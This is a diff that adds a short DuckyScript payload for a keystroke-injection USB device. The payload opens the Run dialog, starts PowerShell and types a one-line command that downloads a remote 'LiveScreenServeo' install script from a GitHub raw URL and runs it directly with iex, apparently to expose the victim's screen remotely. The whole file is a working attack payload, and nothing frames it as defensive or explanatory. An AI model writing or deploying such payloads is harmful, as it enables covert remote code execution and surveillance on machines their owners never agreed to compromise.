@@ -1,0 +1,9 @@
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 3500
+STRING iwr -useb "https://raw.githubusercontent.com/ZyLuxx7/ZyLuxx7/main/LiveScreenServeo/qinstall.ps1" | iex
+DELAY 1000
+ENTER
